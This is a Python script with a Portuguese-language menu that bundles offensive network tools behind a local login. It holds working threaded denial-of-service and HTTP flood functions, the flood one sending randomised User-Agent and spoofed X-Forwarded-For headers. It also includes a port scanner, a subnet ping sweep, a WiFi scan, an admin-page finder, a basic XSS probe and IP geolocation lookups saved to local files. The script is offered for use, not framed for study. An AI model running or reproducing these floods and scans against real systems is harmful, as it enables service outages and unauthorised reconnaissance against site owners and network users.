_L='URL alvo (http/https): '
_K='Alvo (IP ou domínio): '
_J='Opção inválida!'
_I='Database vazio.'
_H='Opção: '
_G='Senha: '
_F=False
_E='- '
_D=None
_C='\n'
_B='utf-8'
_A=True
import os,sys
from datetime import datetime
import json,socket,threading,time,random,string,psutil,pyfiglet,secrets,requests,subprocess
from queue import Queue
import getpass,hashlib,crypto,re
from colorama import init,Fore,Style
init(autoreset=_A)
DB_FILENAME='ip_queries.json'
DB_PATH=os.path.join(os.path.dirname(os.path.abspath(__file__)),DB_FILENAME)
if not os.path.exists(DB_PATH):
	with open(DB_PATH,'w',encoding=_B)as f:json.dump([],f)
def load_queries():
	'Carrega lista de consultas salvas.'
	try:
		with open(DB_PATH,'r',encoding=_B)as A:return json.load(A)
	except Exception:return[]
def save_queries(data):
	'Salva lista de consultas no arquivo JSON.'
	with open(DB_PATH,'w',encoding=_B)as A:json.dump(data,A,ensure_ascii=_F,indent=2)
DB_FILENAME='database.txt'
DB_PATH=os.path.join(os.path.dirname(os.path.abspath(__file__)),DB_FILENAME)
if not os.path.exists(DB_PATH):open(DB_PATH,'w',encoding=_B).close()
def load_data():
	try:
		with open(DB_PATH,'r',encoding=_B)as A:return[A.strip()for A in A if A.strip()]
	except:return[]
def save_data(data):
	with open(DB_PATH,'w',encoding=_B)as A:
		for B in data:A.write(B+_C)
USERS_FILE=os.path.join(os.path.dirname(os.path.abspath(__file__)),'users.json')
def load_users():
	try:
		with open(USERS_FILE,'r',encoding=_B)as A:return json.load(A)
	except FileNotFoundError:return{}
def save_users(users):
	with open(USERS_FILE,'w',encoding=_B)as A:json.dump(users,A,ensure_ascii=_F,indent=2)
def hash_password(password):return hashlib.sha256(password.encode(_B)).hexdigest()
def create_initial_user():
	A=load_users()
	if not A:
		print(Fore.YELLOW+'Nenhum usuário encontrado. Crie o admin inicial.')
		while _A:
			B=input(Fore.CYAN+'Novo usuário (admin): ').strip();C=getpass.getpass(_G).strip();D=getpass.getpass('Confirme a senha: ').strip()
			if not B or C!=D:print(Fore.RED+'Usuário vazio ou senhas não conferem. Tente novamente.');continue
			A[B]=hash_password(C);save_users(A);print(Fore.GREEN+f"Usuário '{B}' criado com sucesso.\n");break
def authenticate():
	A=load_users()
	for D in range(3):
		B=input(Fore.CYAN+'Usuário: ').strip();C=getpass.getpass(_G).strip()
		if B in A and A[B]==hash_password(C):print(Fore.GREEN+'Login bem-sucedido!\n');return _A
		else:print(Fore.RED+'Usuário ou senha inválidos.\n')
	return _F
def center_text(text):A=os.get_terminal_size().columns;return _C.join(B.center(A)for B in text.splitlines())
def show_system_info():A=psutil.cpu_percent(interval=_D);B=psutil.virtual_memory().percent;C=f"CPU: {A:5.1f}% | RAM: {B:5.1f}%";print(Fore.MAGENTA+center_text(C))
def show_banner(text='ZXVK',font='standard'):A=pyfiglet.figlet_format(text,font=font);print(Fore.GREEN+center_text('Executado com sucesso.'));print(Fore.CYAN+center_text('Sistema de segurança ativado.')+_C);print(Fore.CYAN+center_text(A)+_C);show_system_info()
def loading_bar(steps=50,delay=.1):
	A=steps;C=os.get_terminal_size().columns;psutil.cpu_percent(interval=_D)
	for B in range(A+1):D=B;E=A-B;F=int(B/A*100);G='#'*D+'-'*E;H=psutil.cpu_percent(interval=_D);I=psutil.virtual_memory().percent;J=f"[{G}] {F:3d}%   CPU: {H:5.1f}%   RAM: {I:5.1f}%";print(Fore.CYAN+J.center(C),end='\r');time.sleep(delay)
	print()
def show_credits():A='By encrypted64 | Discord: https://discord.gg/993tCR8F';print(Style.DIM+Fore.YELLOW+center_text(A))
def manage_database():
	A=load_data()
	while _A:
		print(Fore.BLUE+'--- Gerenciar Database ---');print(Fore.YELLOW+'1.'+Style.RESET_ALL+' Adicionar dado');print(Fore.YELLOW+'2.'+Style.RESET_ALL+' Mostrar dados');print(Fore.YELLOW+'3.'+Style.RESET_ALL+' Gerar keys criptografadas');print(Fore.YELLOW+'4.'+Style.RESET_ALL+' Voltar');B=input(Fore.BLUE+_H).strip()
		if B=='1':
			print(Fore.YELLOW+'Digite os dados (digite FIM para terminar):')
			while _A:
				C=input('> ').strip()
				if C.upper()=='FIM':break
				A.append(C)
			save_data(A);print(Fore.GREEN+'Dados adicionados!')
		elif B=='2':
			A=load_data()
			if A:
				print(Fore.CYAN+'Itens no database:')
				for D in A:print(_E+D)
			else:print(Fore.RED+_I)
		elif B=='3':
			E=int(input(Fore.YELLOW+'Quantas keys gerar?: '))
			for F in range(E):A.append(secrets.token_hex(16))
			save_data(A);print(Fore.GREEN+'Keys geradas e salvas!')
		elif B=='4':return
		else:print(Fore.RED+_J)
def filter_ips():
	D=input(Fore.YELLOW+'Domínio (ex: google.com): ').strip()
	try:
		E=socket.getaddrinfo(D,_D);A=sorted({A[4][0]for A in E})
		if A:
			print(Fore.GREEN+'IPs encontrados:')
			for F in A:print(_E+F)
			B=load_data();C=[A for A in A if A not in B]
			if C:B.extend(C);save_data(B);print(Fore.GREEN+f"{len(C)} IP(s) salvos.")
		else:print(Fore.RED+'Nenhum IP retornado.')
	except Exception as G:print(Fore.RED+f"Erro: {G}")
def ip_tracker():
	A=load_data()
	if A:
		print(Fore.BLUE+'IPs no Database:')
		for B in A:print(_E+B)
	else:print(Fore.RED+_I)
def dos_test():
	B=input(Fore.YELLOW+_K).strip();C=int(input(Fore.YELLOW+'Porta: '));A=int(input(Fore.YELLOW+'Threads: '));print(Fore.CYAN+'Iniciando DoS local... (CTRL+C para parar)')
	def D():
		while _A:
			try:A=socket.socket();A.connect((B,C));A.send(b'GET / HTTP/1.1\r\nHost: \r\n\r\n');A.close()
			except:pass
	for E in range(A):threading.Thread(target=D,daemon=_A).start()
	try:
		while _A:time.sleep(1)
	except KeyboardInterrupt:print(Fore.RED+'DoS interrompido.')
def random_string(length=8):return''.join(random.choices(string.ascii_letters+string.digits,k=length))
def flood_site():
	A=input(Fore.YELLOW+_L).strip();B=int(input(Fore.YELLOW+'Threads simultâneas: '));print(Fore.CYAN+'Iniciando flood... (CTRL+C para parar)')
	def C():
		while _A:
			try:B={'User-Agent':f"Mozilla/5.0 ({random_string(6)})",'X-Forwarded-For':'.'.join(str(random.randint(0,255))for A in range(4))};requests.get(A,headers=B,timeout=3);print(Fore.GREEN+'.',end='')
			except:print(Fore.RED+'x',end='')
	for D in range(B):threading.Thread(target=C,daemon=_A).start()
	try:
		while _A:time.sleep(1)
	except KeyboardInterrupt:print(Fore.RED+'Flood encerrado.')
def wifi_scan():
	B=input(Fore.YELLOW+'Interface WiFi (ex: wlan0): ').strip();print(Fore.CYAN+'Escaneando redes... (root necessário)')
	try:
		C=subprocess.check_output(['sudo','iwlist',B,'scan'],stderr=subprocess.DEVNULL).decode();A=set(re.findall('ESSID:"([^"]+)"',C));print(Fore.GREEN+f"Redes encontradas ({len(A)}):")
		for D in A:print(_E+D)
	except Exception as E:print(Fore.RED+f"Erro: {E}")
def network_scan():
	L='N/A';M=input(Fore.YELLOW+'Prefixo inicial (ex: X.Y.Z.1): ').strip();N=input(Fore.YELLOW+'Prefixo final   (ex: X.Y.W.1): ').strip()
	def G(raw):
		A=raw.split('.')
		if len(A)!=4 or A[3]!='1':raise ValueError('Use formato X.Y.Z.1')
		return int(A[0]),int(A[1]),int(A[2])
	try:O,P,H=G(M);Q,Q,I=G(N)
	except Exception as R:print(Fore.RED+f"Erro no formato: {R}");return
	if H>I:print(Fore.RED+'Prefixo inicial maior que o final.');return
	for S in range(H,I+1):
		D=f"{O}.{P}.{S}.";print(Fore.CYAN+f"\nEscaneando hosts em {D}1-254...\n");B=[]
		def T(ip):
			A=['ping','-n'if os.name=='nt'else'-c','1',ip]
			if subprocess.call(A,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)==0:B.append(ip);print(Fore.GREEN+ip)
		J=[]
		for U in range(1,255):A=D+str(U);E=threading.Thread(target=T,args=(A,),daemon=_A);E.start();J.append(E)
		for E in J:E.join()
		print(Fore.BLUE+f"Scan concluído para {D}1/24: {len(B)} hosts ativos.")
		if not B:print(Fore.YELLOW+'Nenhum host encontrado nesta rede.')
		F=load_data()
		for A in B:
			V=int(A.split('.')[0])
			if V in(10,172,192):C=f"{A} | Private IP"
			else:
				try:K=requests.get(f"http://ip-api.com/json/{A}",timeout=3).json();C=f"{A} | ISP: {K.get('isp',L)} | Cidade: {K.get('city',L)}"
				except:C=f"{A} | ISP/Cidade: N/A"
			print(Fore.YELLOW+C)
			if C not in F:F.append(C)
		save_data(F);print(Fore.GREEN+f"{len(B)} entradas salvas para {D}1/24.")
	print(Fore.CYAN+'\nTodas as redes da faixa escaneadas com sucesso.')
def vuln_scan():
	A=input(Fore.YELLOW+_L).strip();print(Fore.CYAN+'Iniciando verificação de vulnerabilidades...')
	try:
		E=requests.get(A,timeout=5);F=E.headers;B=[]
		for D in['X-Frame-Options','Content-Security-Policy','X-XSS-Protection','Strict-Transport-Security']:
			if D not in F:B.append(D)
		if B:print(Fore.RED+'Faltam headers de segurança: '+', '.join(B))
		else:print(Fore.GREEN+'Headers de segurança presentes.')
		C='<script>alert(1)</script>';G=A+('?q='+C if'?'not in A else'&q='+C);H=requests.get(G,timeout=5)
		if C in H.text:print(Fore.RED+'Possível XSS detectado!')
		else:print(Fore.GREEN+'Teste XSS básico não detectou vulnerabilidades.')
	except Exception as I:print(Fore.RED+f"Erro: {I}")
def find_admin_page():
	C=input(Fore.YELLOW+'Digite a URL base (ex: https://exemplo.com): ').strip().rstrip('/');print(Fore.CYAN+f"Iniciando busca avançada de páginas admin em {C}...");B=set()
	try:
		I=requests.get(C+'/robots.txt',timeout=5).text
		for F in I.splitlines():
			if F.lower().startswith('disallow:'):
				G=F.split(':',1)[1].strip()
				if G:B.add(G)
	except:pass
	J=['/admin','/administrator','/login','/admin/login','/user/login','/controlpanel','/cpanel','/adm','/admin.php','/admin.html'];D=set(J)|B;E=[];K=threading.Lock()
	def L(path):
		A=C+path
		try:
			B=requests.get(A,timeout=5)
			if B.status_code==200:
				with K:print(Fore.GREEN+f"[200] {A}");E.append(A)
			else:print(Fore.YELLOW+f"[{B.status_code}] {A}")
			if'text/html'in B.headers.get('Content-Type',''):
				for F in re.findall('href=["\\\']?([^"\\\'>]+)["\\\']?',B.text,re.IGNORECASE):
					if F.startswith('/')and F not in D:D.add(F)
		except Exception as G:print(Fore.RED+f"Erro {A}: {G}")
	H=[]
	for M in list(D):A=threading.Thread(target=L,args=(M,),daemon=_A);A.start();H.append(A);time.sleep(.1)
	for A in H:A.join()
	if not E:print(Fore.RED+'Nenhuma página admin encontrada.')
	else:print(Fore.CYAN+f"Total encontradas: {len(E)}")
	input(Fore.BLUE+'Pressione Enter para voltar ao menu...')
def consulta_ip_info_detalhada():
	"\n    Consulta informações completas de geolocalização e rede de um IP ou domínio\n    usando a API do ip‑api.com, salva o resultado em JSON e oferece busca no Google Maps.\n    Se o usuário digitar 'ALL', faz a consulta para todos os registros existentes em database.txt.\n    ";F='query';B=input(Fore.YELLOW+'Informe IP, domínio ou ALL para tudo: ').strip();C=[]
	if B.upper()=='ALL':
		from pathlib import Path;G=Path(DB_PATH.replace('.json','.txt'))
		if not G.exists():print(Fore.RED+'Arquivo de database não encontrado.');return
		with open(G,'r',encoding=_B)as L:
			for D in L:
				D=D.strip()
				if D:C.append(D.split()[0])
		if not C:print(Fore.RED+'Nenhum IP/domínio em database.txt.');return
		print(Fore.CYAN+f"Iniciando consultas para {len(C)} alvos...\n")
	else:C=[B]
	for B in C:
		try:H=socket.gethostbyname(B)
		except socket.gaierror:print(Fore.RED+f"Não foi possível resolver domínio: {B}");continue
		print(Fore.CYAN+f"\nConsultando informações para {H}...\n");M='status,message,query,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy'
		try:A=requests.get(f"http://ip-api.com/json/{H}?fields={M}",timeout=5).json()
		except requests.RequestException as N:print(Fore.RED+f"Erro na requisição: {N}");continue
		if A.get('status')!='success':print(Fore.RED+f"Falha na consulta: {A.get('message','unknown error')}");continue
		print(Style.BRIGHT+Fore.GREEN+f"IP:               {A.get(F)}");print(Fore.GREEN+f"País:             {A.get('country')} ({A.get('countryCode')})");print(Fore.GREEN+f"Região:           {A.get('regionName')} ({A.get('region')})");print(Fore.GREEN+f"Cidade:           {A.get('city')} | CEP: {A.get('zip')}");I=A.get('lat');J=A.get('lon');print(Fore.GREEN+f"Coordenadas:      {I}, {J}");print(Fore.GREEN+f"Fuso horário:     {A.get('timezone')}");print(Fore.GREEN+f"ISP:              {A.get('isp')}");print(Fore.GREEN+f"Organização:      {A.get('org')}");print(Fore.GREEN+f"Sistema Autônomo: {A.get('as')}");print(Fore.GREEN+f"Reverse DNS:      {A.get('reverse')}");print(Fore.GREEN+f"Mobile:           {A.get('mobile')}");print(Fore.GREEN+f"Proxy:            {A.get('proxy')}");K=f"https://www.google.com/maps/search/?api=1&query={I},{J}";print(Fore.YELLOW+f"Google Maps: {K}");O={'timestamp':datetime.utcnow().isoformat()+'Z',F:A.get(F),'result':A,'maps_url':K};E=load_queries();E.append(O);save_queries(E);print(Fore.CYAN+f"Consulta salva em {DB_FILENAME} ({len(E)} registros).")
	print()
def scan_ports():
	C=input(Fore.YELLOW+_K).strip()
	try:D=socket.gethostbyname(C)
	except socket.gaierror:print(Fore.RED+f"Não foi possível resolver o host: {C}");return
	E=int(input(Fore.YELLOW+'Porta inicial: '));F=int(input(Fore.YELLOW+'Porta final: '));H=int(input(Fore.YELLOW+'Número de threads: '));print(Fore.CYAN+f"Iniciando scan em {D} de {E} até {F}...\n");A=Queue()
	for I in range(E,F+1):A.put(I)
	B=[]
	def J():
		while not A.empty():
			C=A.get()
			with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as E:
				E.settimeout(.5)
				if E.connect_ex((D,C))==0:print(Fore.GREEN+f"[OPEN] Porta {C}");B.append(C)
			A.task_done()
	K=[]
	for M in range(H):G=threading.Thread(target=J,daemon=_A);G.start();K.append(G)
	A.join()
	if B:
		print(Fore.BLUE+'\nPortas abertas encontradas:')
		for L in sorted(B):print(f" - {L}")
	else:print(Fore.RED+'\nNenhuma porta aberta encontrada.')
	input(Fore.BLUE+'\nPressione Enter para voltar ao menu...')
if __name__=='__main__':
	loading_bar();show_credits();show_banner();create_initial_user()
	if not authenticate():print(Fore.RED+'Falha na autenticação. Encerrando...');sys.exit(1)
	while _A:
		show_credits();show_banner();print(Fore.BLUE+'=== Painel Principal ===');print(Fore.YELLOW+'1.'+Style.RESET_ALL+' Gerenciar database');print(Fore.YELLOW+'2.'+Style.RESET_ALL+' Filtrar IPs de Site');print(Fore.YELLOW+'3.'+Style.RESET_ALL+' IP Tracker');print(Fore.YELLOW+'4.'+Style.RESET_ALL+' Ataque DoS (Threads)');print(Fore.YELLOW+'5.'+Style.RESET_ALL+' Flood Site (El Diablo)');print(Fore.YELLOW+'6.'+Style.RESET_ALL+' WiFi Pentest & Scan');print(Fore.YELLOW+'7.'+Style.RESET_ALL+' Scan de Rede Local');print(Fore.YELLOW+'8.'+Style.RESET_ALL+' Vulnerability Scanner');print(Fore.YELLOW+'9.'+Style.RESET_ALL+' Encontrar página admin');print(Fore.YELLOW+'10.'+Style.RESET_ALL+' Consulta IP');print(Fore.YELLOW+'11.'+Style.RESET_ALL+' Scan de portas abertas em um IP/HOST (Roteador)');print(Fore.YELLOW+'12.'+Style.RESET_ALL+' Sair');choice=input(Fore.BLUE+_H).strip()
		if choice=='1':manage_database()
		elif choice=='2':filter_ips()
		elif choice=='3':ip_tracker()
		elif choice=='4':dos_test()
		elif choice=='5':flood_site()
		elif choice=='6':wifi_scan()
		elif choice=='7':network_scan()
		elif choice=='8':vuln_scan()
		elif choice=='9':find_admin_page()
		elif choice=='10':consulta_ip_info_detalhada()
		elif choice=='11':scan_ports()
		elif choice=='12':print(Fore.GREEN+'Saindo...');loading_bar();show_credits();show_banner();break
		else:print(Fore.RED+_J)
		time.sleep(1);os.system('cls'if os.name=='nt'else'clear')
